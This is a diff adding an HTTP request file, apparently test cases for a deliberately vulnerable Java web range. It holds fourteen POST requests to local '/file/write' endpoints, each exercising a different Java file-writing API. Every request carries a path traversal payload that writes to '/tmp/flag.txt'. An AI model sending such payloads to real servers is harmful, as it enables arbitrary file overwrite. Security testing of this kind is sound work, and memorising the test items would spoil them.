@@ -1,0 +1,124 @@
+###
+# case1 write_OutputStreamWriter
+POST /file/write/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case2 write_FileWriter
+POST /file/write/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case3 write_FileWriter_BufferedWriter
+POST /file/write/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case4 write_FileWriter_CharArrayWriter
+POST /file/write/case4 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case5 write_FileWriter_PrintWriter
+POST /file/write/case5 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case6 write_PrintWriter_BufferedWriter_FileWriter
+POST /file/write/case6 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case7 write_FileOutputStream
+POST /file/write/case7 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case8 write_PrintStream
+POST /file/write/case8 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case9 write_RandomAccessFile
+POST /file/write/case9 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case10 write_FileChannel
+POST /file/write/case10 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case11 write_Files
+POST /file/write/case11 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case111 write_Files 重命名保留后缀
+POST /file/write/case111 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case12 write_FileUtils
+POST /file/write/case12 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
+
+
+###
+# case13 write_FileOutputStream_file
+POST /file/write/case13 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+filePath=../../../../../../../../../../../../../../../../../../../../tmp/flag.txt&fileContent=xxx
